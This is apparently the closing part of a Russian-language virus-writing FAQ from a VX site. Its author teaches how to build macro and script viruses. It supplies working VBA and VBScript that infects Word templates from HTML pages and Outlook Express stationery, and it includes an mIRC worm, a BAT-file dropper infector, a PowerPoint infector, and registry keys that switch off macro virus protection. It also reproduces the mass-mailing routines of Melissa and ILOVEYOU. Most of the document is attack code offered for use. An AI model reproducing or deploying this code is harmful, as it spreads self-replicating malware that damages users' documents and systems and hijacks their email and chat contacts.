xlApp.Workbooks("cs.xls").Close SaveChanges:=True
End If
If Quit = 1 Then xlApp.Application.Quit
</pre>
<h3><a name="p43">4.3. Где еще использовать комманды SetObject и CreateObject?</a></h3>
<p>A.: Везде, где можно использовать VisualBasic. Вот как сделать заражение Word97 из HTM файла:</p>
<pre class="source">
&lt;html&gt; &lt;CyberShadow&gt;
&lt;BODY&gt;
&lt;script language="VBScript"&gt;&lt;!--
Private Sub Window_Onload
On Error Resume Next
If location.protocol = "file:" then
Dim FSO
Set FSO = CreateObject("Scripting.FileSystemObject")
HostPath = Replace(location.href, "file:///", "")
HostPath = Replace(HostPath, "/", "")
Set WordObj = GetObject("","Word.Application"): Quit = 0
If WordObj = "" Then
Set WordObj = CreateObject("Word.Application"): Quit = 1
End If
Set NT = WordObj.Templates(1).VBProject.VBComponents(1).Codemodule
If NT.Lines(1,1) &lt;&gt; "'&lt;html&gt; &lt;CyberShadow&gt;" then
WordObj.Options.SaveNormalPrompt = False
NT.DeleteLines 1, NT.CountOfLines
NT.Addfromfile HostPath
NT.DeleteLines NT.CountOfLines-3,3
For j = 1 to 3
NT.ReplaceLine j, "'" + NT.Lines(j,1)
Next
End If
Set NT = Nothing
if Quit=1 then WordObj.Quit
End if
End Sub
Private Sub Document_Close()
MsgBox "You are infected!"
End Sub
--&gt;&lt;/script&gt;
&lt;/BODY&gt;
&lt;/HTML&gt;
</pre>
<h3><a name="p44">4.4. Можно ли запустить какую-нибудь программу пользуяюсь средствами VBA?</a></h3>
<p>A.: <code>rv = Shell("c:\dropper.com", 6)</code>, эта строчка запускает файл dropper.com с диска C как отдельную задачу свернутую в значок.</p>
<h3><a name="p45">4.5. Можно ли получить доступ к системному окружению?</a></h3>
<p>A.: Разумеется. Следующий пример распечатывает PATH:</p>
<pre class="source">
Private Sub GetPath()
a = Environ("PATH")
i = 1
Do While i &lt;= Len(a)
c = ""
Do While i &lt;= Len(a) And Mid$(a, i, 1) &lt;&gt; ";"
c = c + Mid$(a, i, 1)
i = i + 1
Loop
MsgBox c
i = i + 1
Loop
End Sub
</pre>
<h3><a name="p46">4.6. Можно ли написать IRC-червя средствами VBA?</a></h3>
<p>A.: Вот пример простейшего IRC-червя:</p>
<pre class="source">
Private Sub Document_Close()
'mirc joke by CyberShadow//SMF
'Smiles to harmless :)
MyDir = CurDir
For i = 0 To 5
a = Chr$(Asc("C") + i)
Call infect(a)
Next
End Sub
Private Sub infect(a)
On Error GoTo outta
a = a + ":\mirc"
Open a + "script.ini" For Output As #1
Print #1, "[script]"
Print #1, "n0=on 1:JOIN:#:/dcc send $nick " + a + "NewFiles.doc"
Close #1
ActiveDocument.Save
ActiveDocument.SaveAs a + "NewFiles.doc"
ActiveDocument.Close
outta:
End Sub
</pre>
<p>Маленькое добавление, этот червяк не совсем корректен, достаточно сменить название директории на mIRC32 и привет... Вот более корректный способ отыскать mIRC через Главное Меню:</p>
<pre class="source">
Private Sub Document_Close()
'Program by CyberShadow//SMF
'more than correct way to find mIRC :)
 a = System.PrivateProfileString("", "HKEY_CURRENT_USER\SOFTWARE\Microsoft\
 	Windows\CurrentVersion\Explorer\Shell Folders", "Programs") + ""
 With Application.FileSearch
  .FileName = "mirc*.exe"
  .MatchAllWordForms = True
  .LookIn = a
  .SearchSubFolders = True
  .Execute
  For i = 1 To .FoundFiles.Count
   c = .FoundFiles(i)
   j = Len(c)
   Do While j > 1
    If Mid$(c, j, 1) = "" Then c = Mid$(c, 1, j): j = 0
    j = j - 1
   Loop
   Call infectMIRC(c)
  Next i
 End With
End Sub
</pre>
<p>Этот способ находит mIRC даже если его запихали в Program Files :) Если конечно mIRC есть в Главном Меню :)</p>
<h3><a name="p47">4.7. А я слышал, можно отключить VirusProtection напрямую из реестра, правда ли это?</a></h3>
<p>A.: Да, правда. Вот несколько ключей в реестре: вырубить предупреждения о запуске опасного ActiveX приложения, очень удобно для cross вирусов типа DOC-HTML-VBS</p>
<p>"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0", "1201" = ""</p>
<p>"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0", "1201" = ""</p>
<p>вырубить MacroVirusProtection для Excel</p>
<p>"HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6" = ""</p>
<p>"HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel", "Options6" = ""</p>
<p>вырубить MacroVirusProtection для Word</p>
<p>"HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options","EnableMacroVirusProtection"="0"</p>
<p>"HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\Word\Options","EnableMacroVirusProtection"="0"</p>
<p>Задать страницу, запускающуюся при старте InternetExplorer</p>
<p>[HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main]</p>
<p>"Start Page"="C:\\WINDOWS\\SYSTEM\\virus.htm"</p>
<p>[HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer\Main]</p>
<p>"Start Page"="C:\\WINDOWS\\SYSTEM\\virus.htm"</p>
<h3><a name="p48">4.8. Как получить адрес папки "Мои документы"?</a></h3>
<p>A.: В разноязычных версиях этот адрес разный (Мои документы как My Documents)</p>
<pre class="source">
Private Sub GetMyDocumentsFolderPath()
a=System.PrivateProfileString("",
	"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\
		Explorer\Shell Folders","Personal")
msgbox a
End Sub
</pre>
<h3><a name="p49">4.9. Как сделать "Проводник" средством запуска VBA вируса?</a></h3>
<p>А.: Проводник в Windows 98 при входе в некоторые папки сканирует их содержимое на предмет нахождения файла folder.htt и, если файл найден, принимает его содержимое как своеобразную программу для просмотра данной папки, причем VB Scripts исполняются тоже! (Думаю не стоит продолжать :). Папки в которых эта хрень создается автоматически:</p>
<p>C:\WINDOWS (или подобная :)</p>
<p>C:\WINDOWS\SYSTEM</p>
<p>C:\WINDOWS\SYSTEM32</p>
<p>C:\WINDOWS\WEB</p>
<p>C:\Program Files</p>
<p>Маленькие дополнения:</p>
<ul>
<li>Файло ищется только в определенных папках;</li>
<li>Точное имя прописывается в desktop.ini;</li>
</ul>
<p>Ко всему этому в реестре содержится информация про конкретную папку, искать этот файл или нет, запускать или нет и т.д.</p>
<h3><a name="p4a">4.10. Может ли VBA вирус переносить в своем теле другие вирусы (трояны)?</a></h3>
<p>А.: Может. Есть различные способы заставить VBA вирус "таскать" с собой <em>любую</em> программу написанную на <em>любом</em> языке.</p>
<p>Первый из них чаще всего используется в VBA вирусах, невзирая на кучу неудобств, но, видимо, пережитки BAT вирусов достаточно сильны :). Способ следующий:</p>
<ul>
<li>во-первых, необходимо наличие в переменной PATH файла DEBUG (входит в стандартную поставку WINDOWS);</li>
<li>во вторых, используется промежуточный BAT файл (обычно AUTOEXEC.BAT).</li>
</ul>
<pre class="source">	
&lt;html&gt; &lt;CyberShadow...&gt;
&lt;BODY onload="TryToLoad();"&gt;
&lt;script language="VBScript"&gt;&lt;!--
Sub TryToLoad
If location.protocol = "file:" then Call CreateDropper
End Sub
Sub CreateDropper
Dim FSO, folder ,fc, f1, cpath
Set FSO = CreateObject("Scripting.FileSystemObject")
Set folder = fso.GetFolder("c:")
Set fc = folder.Files
For each f1 in fc
s = Lcase(Fso.GetExtensionName(f1.name))
if s = "bat" then
Set fh = fso.opentextfile(f1.path, 1, true)
TestString = fh.readline
fh.close
if TestString &lt;&gt; "@rem CyberShadow..." then
Set fh = fso.opentextfile(f1.path, 1, true)
TempFile = fso.GetTempName
fso.CopyFile f1.path, TempFile
fh.close
Set fh = fso.opentextfile(TempFile, 1, true)
Set fv = fso.opentextfile(f1.path, 2, true)
&#9; fv.writeline "@rem CyberShadow..."
&#9; fv.writeline "@echo off"
fv.writeline 
"echo n argon.com &gt;cybers.dmp"
fv.writeline 
"echo e 0100 B0 13 CD 10 B9 3F 78 33 F6 B8 D9 FF F7 E9 03 F2 &gt;&gt;cybers.dmp"
fv.writeline 
"echo e 0110 03 CE 88 AF E8 FD D0 BF E8 FD 4B 81 FB FF 3F 75 &gt;&gt;cybers.dmp"
fv.writeline 
"echo e 0120 E8 43 68 00 A0 07 06 1F 33 FF 33 C9 88 2D 88 AD &gt;&gt;cybers.dmp"
fv.writeline 
"echo e 0130 7C 01 BE 7D 01 2B F7 88 2C 88 AC 7C 01 83 C7 03 &gt;&gt;cybers.dmp"
fv.writeline 
"echo e 0140 FE C5 80 FD 40 75 E5 33 F6 BA C8 03 B0 01 EE 42 &gt;&gt;cybers.dmp"
fv.writeline 
"echo e 0150 B9 00 03 F3 6E 0E 1F 42 B1 C8 33 FF 8A D9 02 DA &gt;&gt;cybers.dmp"
fv.writeline 
"echo e 0160 8A B7 E8 FD 32 ED 8A DE 8A 87 E8 FD 2A C1 8A E0 &gt;&gt;cybers.dmp"
fv.writeline 
"echo e 0170 02 E6 2B C1 F6 C1 01 74 02 86 E0 AB FE C3 FE C5 &gt;&gt;cybers.dmp"
fv.writeline 
"echo e 0180 80 FD A0 72 E3 FE C9 75 D3 E4 60 FE C8 75 C8 C3 &gt;&gt;cybers.dmp"
fv.writeline "echo rcx &gt;&gt;cybers.dmp"
fv.writeline "echo 90 &gt;&gt;cybers.dmp"
fv.writeline "echo w &gt;&gt;cybers.dmp"
fv.writeline "echo q &gt;&gt;cybers.dmp"
fv.writeline "debug &lt;cybers.dmp &gt;nul"
fv.writeline "argon.com"
fv.writeline "del cybers.dmp &gt;nul"
fv.writeline "del argon.com &gt;nul"
Do While fh.AtEndOfStream &lt;&gt; True
fv.WriteLine fh.ReadLine
Loop
fv.close
fh.close
fso.DeleteFile TempFile
end if
end if
Next
End Sub
--&gt;&lt;/script&gt;
&lt;/BODY&gt;
&lt;/HTML&gt;
</pre>
<p>Этот пример находит все .BAT файлы в корневом каталоге диска C: и "заражает" их .COM файлом. При запуске "зараженного" .BAT файла будет выведен на экран небольшой видеоэффект. Как видно из исходника, очень неудобный, хотя и примитивный алгоритм. Кроме того, не очень действенный (вдруг на машине не окажется DEBUG?).</p>
<p>Второй способ требует большей мозговой активности, но и возможности у него больше. Дроппер хранится в текстовом виде, что-то типа UUE кодирования и расшифровывается сразу в файл-жертву. Преимущества налицо, не требуется дополнительных файлов, алгоритм немногим сложнее, открываются большие возможности для шифрования/полиморфизма/архивирования. Вот мой вариант процедуры распаковки, используется в вирусе THETHING:</p>
<pre class="source">
Private Sub WriteDump(dropperPath)
On Error Resume Next
'При ошибке - иди дальше
Set AD = ActiveDocument.VBProject.VBComponents(1).CodeModule
'Указатель на текст вируса
checkit = "Dumpin"
'Часть строки поиска (всю указывать не стал, 
' чтобы не возникали проблемы с лже-find'ом
i = 1: GetDump = 0
'Пошли счетчики
Do While i &lt; AD.countoflines
'Пока есть строки
a = AD.lines(i, 1)
'Взять текущую строку
If Len(a) &gt; Len(checkit) Then
For j = 1 To Len(a) - Len(checkit)
If Mid$(a, j, Len(checkit) + 1) = checkit + "g" Then 
	GetDump = i + 1: i = AD.countoflines
'Поехали проверять (добавляем "g" дабы искать полную строку)
Next
End If
i = i + 1
Loop
dropperBody = ""
Do While Mid$(AD.lines(GetDump, 1), 1, 1) = "'"
'Пока не пустая строка (метка конца дроппера)
If Len(AD.lines(GetDump, 1)) &gt; 2 Then
For i = 2 To Len(AD.lines(GetDump, 1)) Step 2
If Mid$(AD.lines(GetDump, 1), i, 1) &lt;&gt; " " Then
a1 = Asc(Mid$(AD.lines(GetDump, 1), i, 1)) - 33
b1 = Asc(Mid$(AD.lines(GetDump, 1), i + 1, 1)) - 33
'Используется примитивный алгоритм UUE кодирования
dropperBody = dropperBody + Chr$(a1 + 16 * b1)
End If
Next
End If
GetDump = GetDump + 1
Loop
Open dropperPath + "thething.com" For Output As #1
Print #1, dropperBody;
'Ну и записали куда надо :)
Close #1
End Sub
Private Sub Dumping()
'Туточки хранятся зашифрованные строки (Щас нету нифига :)
End Sub
</pre>
<h3><a name="p4b">4.11. Power Point вирусы</a></h3>
<p>Верная своим принципам - больше вирусов разных :) Microsoft и PowerPoint не обделила возможностью быть зараженным! Здесь правда есть одно но: если у Word'a есть Normal.dot у Excel XLStart, то у PowerPoint'a отсутствует автоматически исполняемая при старте презентация :( Посему заражение возможно либо "нерезидентным" способом, либо заразить все презентации одновременно загруженные вместе с зараженной. Кроме того, автоматический запуск вируса в презентации тоже та еще проблема :( Вот как все эти фичи обходит 1nternal в своем (первом в мире!) PPT.Attach:</p>
<pre class="source">
'!--1nternal--
'PPT.Attach v0.1 /1nternal
Private Sub UserForm_Terminate()
'При закрытии ЮзерФормы
On Error Resume Next
Set Home = ActivePresentation
'Откель брать исходник вируса
Set fs = Application.FileSearch
'Поехал новых поиск
fs.NewSearch
fs.LookIn = "C:\My Documents"
'Ай-яй-яй как некорректно :) На русской версии облом...
fs.SearchSubFolders = True
'Но все ж глянем в подкаталогах
fs.FileName = "*.ppt"
'Ищем жертву :)
fs.Execute
For i = 1 To fs.FoundFiles.Count
'Во всех найденных файлах
If InStr(1, fs.FoundFiles(i), "~", 1) = 0 And fs.FoundFiles(i) &lt;&gt; 
	Home.FullName Then
'Кроме источника
Set PVict = Presentations.Open(fs.FoundFiles(i))
'Вскрыли жертву
For j = 1 To PVict.VBProject.VBcomponents.Count
'Пошарились во всех модулях
If PVict.VBProject.VBcomponents(j).Type = 3 Then
'Хрен его знает, что за тип...
If PVict.VBProject.VBcomponents(j).Codemodule.Lines(1, 1) &lt;&gt; 
	"'!--1nternal--" Then
'Это наш родственник?
PVict.VBProject.VBcomponents(j).Codemodule.InsertLines 1, 
	Home.VBProject.VBcomponents(Name).Codemodule.Lines(1, 27)
'Нифига, так сделаем родственника!
PVict.Save
'Запишем все на место
End If
End If
Next
PVict.Close
'Ну и закроем нахрен
End If
Next
Set PVict = Nothing
End Sub
</pre>
<p>То есть в теории все как у Word и Excel с поправками на PowerPoint:</p>
<p>Источник вируса - ActivePresentation</p>
<p>Открыть презентацию - Presentations.Open ("Имя презентации") и так далее...</p>
<p>Но, презентации редко копируются с машины на машину, во-всяком случае намного реже документов Word и Excel. По-моему, единственная цель заражения PPT-шек, это использовать их как контейнер для хранения кроссплатформенных вирусов, т.е. заражая через команды SetObject и GetObject...</p>
<h3><a name="p4c">4.12. Да здраствует E-MAIL!</a></h3>
<p>А теперь, дорогие мои деточки :) я расскажу вам о самом быстром способе распространения script вирусов - via e-mail... К сожалению, заплатка на Outlook лишила нас этой возможности, но ведь всегда есть лохи, которые пока гром не грянет ...</p>
<p>Итак, что же это такое, e-mail вирусы? Как написал автор Melissa:</p>
<pre class="source">
'Worm? Macro Virus? Word 97 Virus? Word 2000 Virus? You Decide! 
'Word -> Email | Word 97 &lt;;--> Word 2000 ... it's a new age! 
</pre>
<p>Каким же образом эти маленькие script деточки заставили заработать мозги програмеров Microsoft? Самые известные из этих вирусов: фактически безвредная Melissa и злостный ILOVEYOU. И тот, и другой вирус вызвали, прежде всего, "передозировку" почты на почтовых серверах, а ILOVEYOU кроме всего, злобно килял кучу юзеровских файлов. Итак:</p>
<p>Нам нужно получить доступ к адресной книге пользователя (после установки заплатки, о таком обращении пользователь будет предупрежден). Вот как это сделано в Melissa:</p>
<pre class="source">
Dim UngaDasOutlook, DasMapiName, BreakUmOffASlice
 'Задали рабочие массивы
Set UngaDasOutlook = CreateObject("Outlook.Application")
 'Дернули Outlook
Set DasMapiName = UngaDasOutlook.GetNameSpace("MAPI")
 'и получили доступ к адресам
 [...]
If UngaDasOutlook = "Outlook" Then
 'Если есть доступ к Outlook (а Outlook есть на машине :) 
DasMapiName.Logon "profile", "password"
 'Приконнектились
For y = 1 To DasMapiName.AddressLists.Count
 'Поехали!!! 
Set AddyBook = DasMapiName.AddressLists(y) 
 'Собственно адресная книга
x = 1
Set BreakUmOffASlice = UngaDasOutlook.CreateItem(0) 
'Создали письмо
For oo = 1 To AddyBook.AddressEntries.Count
'По всем адресам
Peep = AddyBook.AddressEntries(x) 
'Дернули адрес получателя
BreakUmOffASlice.Recipients.Add Peep
'Добавили его в наше письмо
x = x + 1
If x > 50 Then oo = AddyBook.AddressEntries.Count
'Не больше 50 писем (этого хватает :) 
Next oo
BreakUmOffASlice.Subject = "Important Message From " &amp; Application.UserName
'Добавили заголовок (вместе с именем отправителя, подлый однако вирус) 
BreakUmOffASlice.Body = 
	"Here is that document you asked for ... don't show anyone else ;-)" 
'Собственно письмо 
BreakUmOffASlice.Attachments.Add ActiveDocument.FullName
'Добавим сюрпризом файл с вирусом (и еще какой-нибудь информацией) 
BreakUmOffASlice.Send
'Ну и отправим нахрен
Peep = ""
Next y
DasMapiName.Logoff
'Усе!!! 
End If
</pre>
<p>В ILOVEYOU несколько посложнее, но тем не менее:</p>
<pre class="source">
sub spreadtoemail()
' процедура посылки писем
On Error Resume Next
dim x,a,ctrlists,ctrentries,malead,b,regedit,regv,regad
set regedit=CreateObject("WScript.Shell")
set out=WScript.CreateObject("Outlook.Application")
'откроем Outlook
set mapi=out.GetNameSpace("MAPI")
'проверим, использует электронную почту вирус
for ctrlists=1 to mapi.AddressLists.Count
set a=mapi.AddressLists(ctrlists) 
x=1
regv=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB"&amp;a) 
if (regv="") then
regv=1
end if
if (int(a.AddressEntries.Count)>int(regv)) then
for ctrentries=1 to a.AddressEntries.Count
malead=a.AddressEntries(x) 
regad=""
regad=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB"&amp;malead) 
if (regad="") then
set male=out.CreateItem(0) 
male.Recipients.Add(malead) 
male.Subject = "ILOVEYOU"
male.Body = vbcrlf&amp;"kindly check the attached LOVELETTER coming from me." 
male.Attachments.Add(dirsystem&amp;"\LOVE-LETTER-FOR-YOU.TXT.vbs")
'засуним в месаг наш вирус
male.Send
' посылаем письмо
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\
	"&amp;malead,1,"REG_DWORD"
end if
x=x+1
next
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\
	"&amp;a,a.AddressEntries.Count
else
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\
	"&amp;a,a.AddressEntries.Count
end if
next
Set out=Nothing
Set mapi=Nothing
end sub
</pre>
<p>Вот и все! Куча пользователей получила письма с вирусом, и, запустив, благополучно отправили еще куче -=8-(= =)</p>
<p>Но и это еще не все!</p>
<p>Недостаток у этих вирусов виден на глаз: нужно запускать приаттаченный файл, а это что ни говори зряшная трата времени и сил пользователя :) Вирус должен быть как можно меньше заметен, собственно и запускаться-то он должен сам, независимо от пользователя :)</p>
<p>Как это сделать? Очень и очень просто! Вы конечно знаете, что Outlook Express позволяет задавать стиль письму (всякий плющ, с Днем Рождения и прочая мура), а никто не задавался вопросом, как это сделано? Достаточно изящно, к письму дописывается HTML файл с описанием стиля письма, так вот, поддержку скриптов туда тоже можно прописать! Вот как это реализовано в стиле ПЛЮЩ:</p>
<pre class="source">
&lt;html&gt;
&lt;head&gt;
&lt;META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=windows-1251"&gt;
&lt;style&gt;
&lt;!--
body,P.msoNormal, LI.msoNormal
{
background-position: top left;
background-repeat: repeat-y;
background-color: "#FFFFFD";
margin-left: 4em;
margin-top: 0em;
margin-bottom: 0em;
color: "#427D64";
font-size: 12pt;
font-weight: normal;
font-family: "Arial";
}
--&gt;
&lt;/style&gt;
&lt;/head&gt;
&lt;BODY background="Плющ.gif"&gt;
&lt;script language="VBScript"&gt;&lt;!--
msgbox "FUCK!!!"
On Error Resume Next
Set WordObj = CreateObject("Word.Application")
Set NT = WordObj.Templates(1).VBProject.VBComponents(1).Codemodule
WordObj.Options.SaveNormalPrompt = False
NT.insertlines 1, "Private Sub Document_Close()"
NT.insertlines 2, " MsgBox ""Ты инфектед :)"""
NT.insertlines 3, "End Sub"
WordObj.NormalTemplate.Save
WordObj.Quit
--&gt;&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</pre>
<p>Что же делает этот файл? Как только пользователь применил зараженный шаблон стиля к своему письму, письмо стало "взрывоопасным". Это значит, что как только пользователь захочет просмотреть свое письмо, вирус получит управление и заразит Word! Причем важно, чтобы его просматривали из Outlook Express.</p>
<p>Как узнать где хранятся эти стили чтобы быстренько их все заразить? А вот как:</p>
<pre class="source">
&lt;script language="VBScript"&gt;&lt;!--
 set wscr=CreateObject("WScript.Shell")
 shitty=wscr.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Shared Tools\
 	Stationery\Stationery Folder")
 msgbox shitty
--&gt;&lt;/script&gt;
</pre>
<p>Таким образом, юзеру не надо тратить время и нервы на запуск нашего вируса :) Один косяк, чаще всего в опциях по умолчанию стоит запрет запуска ActiveX приложений :(</p>
<h2><a name="p5">5. Куда писать ругательства, по поводу всего этого?</a></h2>
<p>Куда угодно! :)</p>
<p>А на e-mail <em><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="d2b1abb0b7a0a1bab3b6bda592bfb3bbbefca0a7">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script></em> присылайте свои пожелания и вопросы, на которые вы хотели бы узнать ответ в следующей версии MACRO FAQ. Обновляться будет по мере поступления новых вопросов.</p>
<h2><a name="p6">6. Благодарности</a></h2>
<p>Как же это я сразу позабыл?!</p>
<p>Огромная куча благодарностей всем кто меня поддерживает!!!</p>
<p>Особо хотелось бы поблагодарить:</p>
<p><em>Duke</em> <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="62110f0450525252220f030b0e4c1017">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> за кучу исходников скриптовых вирусов.</p>
<p><em>Ultras</em> <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="1c6970686e7d6f2e5c696f7d32727968">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> за то, что читает сырцы моих вирусов :)</p>
<p><em>Классный сайт topdev.cjb.net</em> за предоставленные исходники и интересные статьи</p>
[<a style="" href="/lib/?lang=RU&amp;index=MA#vcs00">Вернуться к списку</a>] [<a href="/lib/vcs00.html#disqus_thread">Комментарии</a>]<br/> <div id="disqus_thread"></div>
<script type="text/rocketscript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname

        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
<div style="margin-top: 2px; float: left;" class="adsapeu">
<script type="text/rocketscript">
<!--
var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
//-->
</script>
</div>
<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vcs00">de</a><a href="/lib/index.php?lang=en&amp;id=vcs00">en</a><a href="/lib/index.php?lang=es&amp;id=vcs00">es</a><a href="/lib/index.php?lang=it&amp;id=vcs00">it</a><a href="/lib/index.php?lang=fr&amp;id=vcs00">fr</a><a href="/lib/index.php?lang=pl&amp;id=vcs00">pl</a><a href="/lib/index.php?lang=ru&amp;id=vcs00">ru</a><a href="/lib/index.php?lang=ua&amp;id=vcs00">ua</a></div>
</body>
</html>
